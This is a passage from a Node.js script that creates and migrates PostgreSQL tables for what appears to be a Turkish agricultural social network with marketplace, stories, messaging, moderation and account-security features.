            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "sellerId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            name TEXT NOT NULL,
            price DOUBLE PRECISION NOT NULL,
            description TEXT,
            image TEXT,
            images JSONB,
            category TEXT,
            stock INTEGER DEFAULT 1,
            "isActive" BOOLEAN DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);


    await pool.query(`
        CREATE TABLE IF NOT EXISTS farmbook_records (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "recordType" TEXT NOT NULL,
            "productName" TEXT,
            quantity DOUBLE PRECISION,
            unit TEXT,
            cost DOUBLE PRECISION DEFAULT 0,
            income DOUBLE PRECISION DEFAULT 0,
            "recordDate" DATE NOT NULL,
            "fieldName" TEXT,
            "fieldSize" DOUBLE PRECISION,
            "fieldSizeUnit" TEXT DEFAULT 'dekar',
            season TEXT,
            year INTEGER,
            notes TEXT,
            "harvestAmount" DOUBLE PRECISION,
            "harvestUnit" TEXT,
            "qualityRating" INTEGER,
            "weatherCondition" TEXT,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // farmbook_records index
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_farmbook_userId ON farmbook_records("userId")`).catch(()=>{});

    await pool.query(`
        CREATE TABLE IF NOT EXISTS saves (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("postId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS blocks (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "blockerId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "blockedId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("blockerId", "blockedId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS hashtags (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            tag TEXT UNIQUE NOT NULL,
            "postCount" INTEGER DEFAULT 1,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS post_hashtags (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "hashtagId" UUID NOT NULL REFERENCES hashtags(id) ON DELETE CASCADE,
            UNIQUE("postId", "hashtagId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS stories (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "mediaUrl" TEXT NOT NULL,
            "mediaType" TEXT DEFAULT 'image',
            caption TEXT,
            text TEXT,
            "textColor" TEXT DEFAULT '#FFFFFF',
            "textLayers" JSONB,
            filter TEXT,
            "linkUrl" TEXT,
            hashtag TEXT,
            mentions JSONB,
            "replyMode" TEXT DEFAULT 'everyone',
            "viewCount" INTEGER DEFAULT 0,
            "likeCount" INTEGER DEFAULT 0,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "expiresAt" TIMESTAMPTZ NOT NULL
        )
    `);

    // ✅ Eski tabloya yeni sütunlar ekle (migration)
    const storyNewCols = [
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "textLayers" JSONB`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS filter TEXT`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "linkUrl" TEXT`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS hashtag TEXT`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS mentions JSONB`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "replyMode" TEXT DEFAULT 'everyone'`,
    ];
    for (const sql of storyNewCols) { await pool.query(sql).catch(() => {}); }

    await pool.query(`
        CREATE TABLE IF NOT EXISTS story_views (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "storyId" UUID NOT NULL REFERENCES stories(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "viewedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("storyId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS story_likes (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "storyId" UUID NOT NULL REFERENCES stories(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("storyId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS comment_likes (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "commentId" UUID NOT NULL REFERENCES comments(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("commentId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS poll_votes (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "optionId" INTEGER NOT NULL,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("postId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS user_interests (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            interest TEXT NOT NULL,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("userId", interest)
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS post_views (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "viewDate" DATE NOT NULL DEFAULT CURRENT_DATE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("postId", "userId", "viewDate")
        )
    `);

    // ─── Keşfet: Kullanıcının gördüğü postları takip et (24 saat sonra sıfırlanır)
    await pool.query(`
        CREATE TABLE IF NOT EXISTS explore_seen_posts (
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "seenAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            PRIMARY KEY ("userId", "postId")
        )
    `);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_explore_seen_user ON explore_seen_posts("userId")`);
    // 24 saatten eski kayıtları sil (günlük çalışan temizleyici için indeks)
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_explore_seen_at ON explore_seen_posts("seenAt")`);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS suspicious_login_reports (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "reportedIp" TEXT,
            "passwordResetToken" TEXT,
            "tokenExpiresAt" TIMESTAMPTZ,
            "isResolved" BOOLEAN DEFAULT FALSE,
            "resolvedAt" TIMESTAMPTZ,
            "reportedAt" TIMESTAMPTZ DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS reports (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "reporterId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "postId" UUID REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID,
            reason TEXT NOT NULL,
            description TEXT,
            status TEXT DEFAULT 'pending',
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "reviewedAt" TIMESTAMPTZ,
            "reviewedBy" TEXT
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS login_history (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            ip TEXT NOT NULL,
            country TEXT,
            city TEXT,
            "userAgent" TEXT,
            "loginType" TEXT DEFAULT 'password',
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS refresh_tokens (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "tokenHash" TEXT NOT NULL,
            ip TEXT,
            "userAgent" TEXT,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "expiresAt" TIMESTAMPTZ NOT NULL,
            "isActive" BOOLEAN DEFAULT TRUE
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS banned_ips (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            ip TEXT UNIQUE NOT NULL,
            reason TEXT,
            "bannedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "expiresAt" TIMESTAMPTZ
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS content_moderation (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID,
            "commentId" UUID,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            content TEXT NOT NULL,
            "harmfulScore" DOUBLE PRECISION DEFAULT 0,
            "isHarmful" BOOLEAN DEFAULT FALSE,
            reason TEXT,
            "moderatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS account_restrictions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL UNIQUE REFERENCES users(id) ON DELETE CASCADE,
            "isRestricted" BOOLEAN DEFAULT FALSE,
            "restrictedAt" TIMESTAMPTZ,
            "restrictedUntil" TIMESTAMPTZ,
            reason TEXT,
            "canPost" BOOLEAN DEFAULT FALSE,
            "canComment" BOOLEAN DEFAULT FALSE,
            "canMessage" BOOLEAN DEFAULT FALSE,
            "canFollow" BOOLEAN DEFAULT FALSE,
            "canLike" BOOLEAN DEFAULT FALSE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS email_preferences (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL UNIQUE REFERENCES users(id) ON DELETE CASCADE,
            unsubscribed BOOLEAN DEFAULT FALSE,
            "unsubscribedAt" TIMESTAMPTZ,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // 🆕 Şifre sıfırlama tokenları
    await pool.query(`
        CREATE TABLE IF NOT EXISTS password_resets (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token TEXT NOT NULL,
            "expiresAt" TIMESTAMPTZ NOT NULL,
            used BOOLEAN DEFAULT FALSE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // 🆕 E-posta doğrulama kodları
    await pool.query(`
        CREATE TABLE IF NOT EXISTS email_verifications (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            code TEXT NOT NULL,
            "expiresAt" TIMESTAMPTZ NOT NULL,
            used BOOLEAN DEFAULT FALSE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // ✅ HATA DÜZELTMESİ: two_factor_codes tablosu eksikti → login'de 500 hatasına yol açıyordu
    await pool.query(`
        CREATE TABLE IF NOT EXISTS two_factor_codes (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            code TEXT NOT NULL,
            purpose TEXT DEFAULT 'login',
            "expiresAt" TIMESTAMPTZ NOT NULL,
            used BOOLEAN DEFAULT FALSE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // 🆕 Bildirim ayarları
    await pool.query(`
        CREATE TABLE IF NOT EXISTS notification_settings (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL UNIQUE REFERENCES users(id) ON DELETE CASCADE,
            likes BOOLEAN DEFAULT TRUE,
            comments BOOLEAN DEFAULT TRUE,
            follows BOOLEAN DEFAULT TRUE,
            messages BOOLEAN DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // 🆕 Takip istekleri (gizli hesaplar için)
    await pool.query(`
        CREATE TABLE IF NOT EXISTS follow_requests (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "requesterId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "targetId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            status        TEXT NOT NULL DEFAULT 'pending',
            "respondedAt" TIMESTAMPTZ,
            "createdAt"   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("requesterId", "targetId")
        )
    `);

    // 🆕 Aktif oturumlar
    await pool.query(`
        CREATE TABLE IF NOT EXISTS active_sessions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId"       UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token          TEXT NOT NULL,
            ip             TEXT,
            "userAgent"    TEXT,
            "createdAt"    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "lastActiveAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "isActive"     BOOLEAN DEFAULT TRUE
        )
    `);

    await pool.query(`CREATE INDEX IF NOT EXISTS idx_follow_requests_target   ON follow_requests("targetId")   WHERE status = 'pending'`);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_follow_requests_requester ON follow_requests("requesterId")`);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_active_sessions_user      ON active_sessions("userId")     WHERE "isActive" = TRUE`);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS video_info (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            duration DOUBLE PRECISION,
            width INTEGER,
            height INTEGER,
            "aspectRatio" TEXT,
            bitrate INTEGER,
            codec TEXT,
            "fileSize" BIGINT,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    // 🆕 Kimlik doğrulama talepleri (token tabanlı onay/red sistemi)
    await pool.query(`
        CREATE TABLE IF NOT EXISTS verification_requests (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token TEXT NOT NULL UNIQUE,
            status TEXT NOT NULL DEFAULT 'pending',
            name TEXT,
            surname TEXT,
            "frontImagePath" TEXT,
            "backImagePath" TEXT,
            "pdfPath" TEXT,
            "reviewedAt" TIMESTAMPTZ,
            "reviewNote" TEXT,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`CREATE INDEX IF NOT EXISTS idx_verif_token ON verification_requests(token)`).catch(()=>{});
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_verif_user ON verification_requests("userId")`).catch(()=>{});
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS "isVerified" BOOLEAN DEFAULT FALSE`).catch(()=>{});
    await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS "privacyExtra" TEXT`).catch(()=>{});

    // ==================== SÜTUN MİGRASYONU (snake_case → camelCase) ====================
    // Eğer DB önceden snake_case ile oluşturulduysa sütunları ekle/yeniden adlandır
    const columnMigrations = [
        // posts tablosu
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS views INTEGER DEFAULT 0`,
        `CREATE TABLE IF NOT EXISTS post_views (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID REFERENCES users(id) ON DELETE SET NULL,
            ip TEXT,
            "viewDate" DATE NOT NULL DEFAULT CURRENT_DATE,
            "createdAt" TIMESTAMPTZ DEFAULT NOW(),
            UNIQUE("postId", "userId", "viewDate")
        )`,
        `CREATE INDEX IF NOT EXISTS idx_post_views_post ON post_views("postId")`,
        `CREATE INDEX IF NOT EXISTS idx_post_views_user ON post_views("userId")`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "likeCount" INTEGER DEFAULT 0`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "commentCount" INTEGER DEFAULT 0`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "saveCount" INTEGER DEFAULT 0`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "mediaType" TEXT DEFAULT 'text'`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "isPoll" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "allowComments" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        // comments tablosu
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "postId" UUID`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "parentId" UUID`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "likeCount" INTEGER DEFAULT 0`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE comments ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        // likes tablosu
        `ALTER TABLE likes ADD COLUMN IF NOT EXISTS "postId" UUID`,
        `ALTER TABLE likes ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE likes ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        // follows tablosu
        `ALTER TABLE follows ADD COLUMN IF NOT EXISTS "followerId" UUID`,
        `ALTER TABLE follows ADD COLUMN IF NOT EXISTS "followingId" UUID`,
        `ALTER TABLE follows ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        // messages tablosu
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "senderId" UUID`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "recipientId" UUID`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "senderUsername" TEXT`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "recipientUsername" TEXT`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "readAt" TIMESTAMPTZ`,
        // notifications tablosu
        `ALTER TABLE notifications ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE notifications ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE notifications ADD COLUMN IF NOT EXISTS "readAt" TIMESTAMPTZ`,
        // saves tablosu
        `ALTER TABLE saves ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE saves ADD COLUMN IF NOT EXISTS "postId" UUID`,
        `ALTER TABLE saves ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        // products tablosu
        `ALTER TABLE products ADD COLUMN IF NOT EXISTS "sellerId" UUID`,
        `ALTER TABLE products ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE products ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE products ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        // stories tablosu
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "mediaUrl" TEXT`,
        // ── Mesaj medya ve sesli mesaj desteği ──────────────────────────────
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "mediaUrl" TEXT`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "mediaType" TEXT DEFAULT 'text'`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "isRead" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "receiverId" UUID`,
        `ALTER TABLE messages ADD COLUMN IF NOT EXISTS "duration" INTEGER`,
        `CREATE INDEX IF NOT EXISTS idx_messages_receiver ON messages("recipientId","isRead") WHERE "isRead" = FALSE`,
        `CREATE INDEX IF NOT EXISTS idx_messages_media ON messages("mediaType") WHERE "mediaType" IS NOT NULL`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "mediaType" TEXT DEFAULT 'image'`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "textColor" TEXT DEFAULT '#FFFFFF'`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "viewCount" INTEGER DEFAULT 0`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "likeCount" INTEGER DEFAULT 0`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "expiresAt" TIMESTAMPTZ`,
        // login_history tablosu
        `ALTER TABLE login_history ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE login_history ADD COLUMN IF NOT EXISTS "userAgent" TEXT`,
        `ALTER TABLE login_history ADD COLUMN IF NOT EXISTS "loginType" TEXT DEFAULT 'password'`,
        `ALTER TABLE login_history ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        // refresh_tokens tablosu
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "userId" UUID`,
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "tokenHash" TEXT`,
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "userAgent" TEXT`,
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "expiresAt" TIMESTAMPTZ`,
        `ALTER TABLE refresh_tokens ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        // users tablosu
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "profilePic" TEXT`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "coverPic" TEXT`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isPrivate" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "emailVerified" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "twoFactorEnabled" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "googleId" TEXT UNIQUE`,
        `CREATE INDEX IF NOT EXISTS idx_users_google_id ON users("googleId")`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isVerified" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "hasFarmerBadge" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "userType" TEXT DEFAULT 'normal_kullanici'`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "lastSeen" TIMESTAMPTZ`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "lastLogin" TIMESTAMPTZ`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isOnline" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isBanned" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "registrationIp" TEXT`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "verifiedAt" TIMESTAMPTZ`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "createdAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "updatedAt" TIMESTAMPTZ DEFAULT NOW()`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "emailNotifications" BOOLEAN DEFAULT TRUE`,
        `ALTER TABLE users ADD COLUMN IF NOT EXISTS "isPoll" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "isPoll" BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "pollOptions" JSONB`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "saveCount" INTEGER DEFAULT 0`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS views INTEGER DEFAULT 0`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "thumbnailUrl" TEXT`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "mediaUrls" TEXT`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "mediaWidth" INTEGER`,
        `ALTER TABLE posts ADD COLUMN IF NOT EXISTS "mediaHeight" INTEGER`,
        // post_media tablosu (çoklu medya için)
        `CREATE TABLE IF NOT EXISTS post_media (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            url TEXT NOT NULL,
            "mediaType" TEXT NOT NULL DEFAULT 'image',
            width INTEGER,
            height INTEGER,
            "sortOrder" INTEGER DEFAULT 0,
            "createdAt" TIMESTAMPTZ DEFAULT NOW()
        )`,
        `CREATE INDEX IF NOT EXISTS idx_post_media_post ON post_media("postId")`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "likeCount" INTEGER DEFAULT 0`,
        `ALTER TABLE stories ADD COLUMN IF NOT EXISTS "viewCount" INTEGER DEFAULT 0`,
        `ALTER TABLE products ADD COLUMN IF NOT EXISTS "isActive" BOOLEAN DEFAULT TRUE`,
        // ✅ BUG DÜZELTMESİ: expiresAt TEXT ise TIMESTAMPTZ'ye çevir (zamanlama hatası önlenir)
        `ALTER TABLE password_resets ALTER COLUMN "expiresAt" TYPE TIMESTAMPTZ USING "expiresAt"::TIMESTAMPTZ`,
        `ALTER TABLE email_verifications ALTER COLUMN "expiresAt" TYPE TIMESTAMPTZ USING "expiresAt"::TIMESTAMPTZ`,
        // ✅ BUG DÜZELTMESİ: used kolonu eksik olabilir → ev.used hatası önlenir
        `ALTER TABLE email_verifications ADD COLUMN IF NOT EXISTS used BOOLEAN DEFAULT FALSE`,
        `ALTER TABLE two_factor_codes ALTER COLUMN "expiresAt" TYPE TIMESTAMPTZ USING "expiresAt"::TIMESTAMPTZ`,
        // 🆕 Kimlik doğrulama talepleri (onay/red e-posta linkleri)
        `CREATE TABLE IF NOT EXISTS verification_requests (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token TEXT NOT NULL UNIQUE,
            status TEXT NOT NULL DEFAULT 'pending',
            name TEXT,
            surname TEXT,
            "frontImagePath" TEXT,
            "backImagePath" TEXT,
            "pdfPath" TEXT,
            "reviewedAt" TIMESTAMPTZ,
            "reviewNote" TEXT,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )`,
        // 🔧 Eski tablolarda yanlış UNIQUE(userId) kısıtını kaldır
        `ALTER TABLE verification_requests DROP CONSTRAINT IF EXISTS "verification_requests_userId_key"`,
